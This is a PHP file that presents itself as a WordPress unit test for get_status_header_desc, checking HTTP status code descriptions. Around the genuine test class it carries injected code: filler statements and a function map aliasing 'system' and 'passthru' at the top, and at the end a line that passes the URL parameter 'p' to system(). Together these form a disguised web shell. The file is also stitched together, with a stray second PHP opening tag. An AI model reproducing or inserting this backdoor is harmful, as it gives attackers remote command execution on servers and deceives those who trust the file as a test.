<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests get_status_header_desc function
 *
 * @since 5.3.0
 *
 * @group functions
 *
 * @covers ::get_status_header_desc
 */
class Tests_Functions_GetStatusHeaderDesc extends WP_UnitTestCase {

	/**
	 * @dataProvider data_get_status_header_desc
	 *
	 * @param int    $code     HTTP status code.
	 * @param string $expected Status description.
	 */
	public function test_get_status_header_desc( $code, $expected ) {
		$this->assertSame( $expected, get_status_header_desc( $code ) );
	}

	/**
	 * Data provider for test_get_status_header_desc().
	 *
	 * @return array[]
	 */
	public function data_get_status_header_desc() {
		return array(
			array( 200, 'OK' ),
			array( 301, 'Moved Permanently' ),
			array( 404, 'Not Found' ),
			array( 500, 'Internal Server Error' ),

			// A string to make sure that the absint() is working.
			array( '200', 'OK' ),

			// Not recognized codes return empty strings.
			array( 9999, '' ),
			array( 'random', '' ),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>